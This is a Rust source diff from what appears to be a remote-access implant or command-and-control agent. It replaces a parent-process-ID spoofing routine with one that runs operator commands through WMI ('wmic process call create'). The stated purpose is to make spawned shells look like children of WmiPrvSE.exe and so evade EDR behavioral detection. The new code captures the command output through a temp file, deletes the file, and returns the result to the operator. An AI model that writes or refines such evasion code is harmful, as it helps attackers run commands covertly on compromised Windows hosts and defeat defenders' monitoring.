@@ -381,80 +381,68 @@ fn shell(cmd: &str) -> String {
     }
 }
 
+/// shell_opsec executes cmd via WMI Win32_Process.Create so the spawned process
+/// runs as a child of WmiPrvSE.exe, evading parent-child EDR behavioral rules.
 #[cfg(target_os = "windows")]
-unsafe fn shell_opsec(cmd: &str) -> String {
-    // Find RuntimeBroker.exe, fall back to explorer.exe for PPID spoof.
-    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if snap == INVALID_HANDLE_VALUE { return shell(cmd); }
-    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
-    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
-    let mut rb_pid = 0u32;
-    let mut ex_pid = 0u32;
-    if Process32First(snap, &mut pe) != 0 {
-        loop {
-            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
-            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
-            if name.eq_ignore_ascii_case("RuntimeBroker.exe") { rb_pid = pe.th32ProcessID; break; }
-            if ex_pid == 0 && name.eq_ignore_ascii_case("explorer.exe") { ex_pid = pe.th32ProcessID; }
-            if Process32Next(snap, &mut pe) == 0 { break; }
-        }
-    }
-    CloseHandle(snap);
-    let parent_pid = if rb_pid != 0 { rb_pid } else { ex_pid };
-    if parent_pid == 0 { return shell(cmd); }
+fn shell_opsec(cmd: &str) -> String {
+    use std::io::Read;
+    use std::process::{Command, Stdio};
 
-    let hparent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parent_pid);
-    if hparent == 0 { return shell(cmd); }
-
-    // Build temp output path.
     let pid = std::process::id();
-    let tick: u32 = {
+    let tick: u32 = unsafe {
         use windows_sys::Win32::System::SystemInformation::GetTickCount;
         GetTickCount()
     };
-    let out_path = format!("C:\\Windows\\Temp\\sbo{:08x}{:08x}.tmp", pid, tick);
-    let cmdline = format!("cmd.exe /d /c {} > \"{}\" 2>&1\0", cmd, out_path);
-    let mut cmdline_w: Vec<u16> = cmdline.encode_utf16().collect();
+    let out_path = format!("C:\\ProgramData\\sbo{:08x}{:08x}.tmp", pid, tick);
+    // inner command redirects output to our temp file
+    let inner = format!("cmd.exe /d /c {} > {} 2>&1", cmd, out_path);
+    // wmic creates the process via WMI; cmd.exe runs under WmiPrvSE.exe
+    let wmic_arg = format!("process call create \"{}\"", inner);
 
-    let mut attr_size = 0usize;
-    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attr_size);
-    let heap = GetProcessHeap();
-    let attr_list = HeapAlloc(heap, 0, attr_size) as LPPROC_THREAD_ATTRIBUTE_LIST;
-    if attr_list.is_null() { CloseHandle(hparent); return shell(cmd); }
-    InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size);
-    UpdateProcThreadAttribute(
-        attr_list, 0,
-        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
-        &hparent as *const isize as *const _,
-        std::mem::size_of::<isize>(),
-        std::ptr::null_mut(),
-        std::ptr::null(),
-    );
+    let wmic_out = Command::new("wmic")
+        .args([&wmic_arg as &str])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .spawn()
+        .and_then(|mut child| {
+            let mut buf = Vec::new();
+            if let Some(mut out) = child.stdout.take() {
+                let _ = out.read_to_end(&mut buf);
+            }
+            let _ = child.wait();
+            Ok(buf)
+        })
+        .unwrap_or_default();
+    let wmic_str = String::from_utf8_lossy(&wmic_out);
 
-    let mut si: STARTUPINFOEXW = std::mem::zeroed();
-    si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
-    si.lpAttributeList = attr_list;
-    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
-    let ok = CreateProcessW(
-        std::ptr::null(), cmdline_w.as_mut_ptr(),
-        std::ptr::null(), std::ptr::null(), 0,
-        EXTENDED_STARTUPINFO_PRESENT | 0x08000000, // CREATE_NO_WINDOW
-        std::ptr::null(), std::ptr::null(),
-        &si.StartupInfo, &mut pi,
-    );
-    DeleteProcThreadAttributeList(attr_list);
-    HeapFree(heap, 0, attr_list as *const _);
-    CloseHandle(hparent);
+    // Parse "ProcessId = NNNN;" from wmic output
+    let child_pid: u32 = wmic_str.find("ProcessId = ")
+        .and_then(|pos| {
+            let rest = &wmic_str[pos + 12..];
+            let end = rest.find(|c: char| !c.is_ascii_digit()).unwrap_or(rest.len());
+            rest[..end].parse().ok()
+        })
+        .unwrap_or(0);
 
-    if ok == 0 { return shell(cmd); }
+    if child_pid > 0 {
+        unsafe {
+            use windows_sys::Win32::System::Threading::WaitForSingleObject;
+            const SYNCHRONIZE: u32 = 0x00100000;
+            let h = OpenProcess(SYNCHRONIZE, 0, child_pid);
+            if h != 0 {
+                WaitForSingleObject(h, 30000);
+                CloseHandle(h);
+            } else {
+                std::thread::sleep(std::time::Duration::from_secs(8));
+            }
+        }
+    } else {
+        std::thread::sleep(std::time::Duration::from_secs(8));
+    }
 
-    WaitForSingleObject(pi.hProcess, 30000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-
-    let out = std::fs::read_to_string(&out_path).unwrap_or_else(|_| "[no output]".into());
+    let out = std::fs::read_to_string(&out_path).unwrap_or_default();
     let _ = std::fs::remove_file(&out_path);
-    out
+    if out.is_empty() { shell(cmd) } else { out }
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -1423,7 +1411,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         "SHELL_OPSEC" => {
             #[cfg(target_os = "windows")]
-            t.send_result(task.id, &unsafe { shell_opsec(&task.args) }, "");
+            t.send_result(task.id, &shell_opsec(&task.args), "");
             #[cfg(not(target_os = "windows"))]
             t.send_result(task.id, &shell(&task.args), "");
         }
